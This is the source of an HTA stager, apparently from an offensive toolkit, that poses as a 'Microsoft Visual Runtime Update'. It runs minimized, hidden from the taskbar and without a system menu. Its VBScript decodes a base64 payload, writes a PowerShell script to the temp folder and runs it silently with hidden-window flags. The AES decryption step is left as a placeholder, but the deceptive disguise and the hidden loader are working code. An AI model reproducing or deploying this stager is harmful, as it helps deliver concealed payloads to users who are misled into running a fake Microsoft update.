<!-- stagers/mshta/decrypt.hta -->
<html>
<head>
  <title>Microsoft Visual Runtime Update</title>
  <hta:application
    applicationname="Updater"
    scroll="no"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
    sysmenu="no">
  <script language="VBScript">
  ' === AES Decryptor & Executor (in-memory) ===
  On Error Resume Next

  payload = "REPLACE_AES" ' Format: ivhex:base64cipher
  parts = Split(payload, ":")
  ivHex = parts(0)
  b64 = parts(1)

  Set objXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set objNode = objXML.CreateElement("base64")
  objNode.DataType = "bin.base64"
  objNode.Text = b64
  cipher = objNode.NodeTypedValue

  ' Convert ivHex to binary
  Set iv = CreateObject("Scripting.Dictionary")
  For i = 0 To Len(ivHex)-2 Step 2
    iv.Add i \ 2, CByte("&H" & Mid(ivHex, i+1, 2))
  Next

  ' Write AES-decryption result to temp file (to execute via powershell)
  temp = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & Rnd() & ".ps1"
  Set f = CreateObject("Scripting.FileSystemObject").CreateTextFile(temp, True)
  f.Write "Write-Output '[!] Placeholder: Decrypt AES with hardcoded key in .hta'"
  f.Close

  ' Execute silently
  Set shell = CreateObject("WScript.Shell")
  shell.Run "powershell -nop -w hidden -c "". """ & temp & """"", 0, False
  </script>
</head>
<body>
</body>
</html>
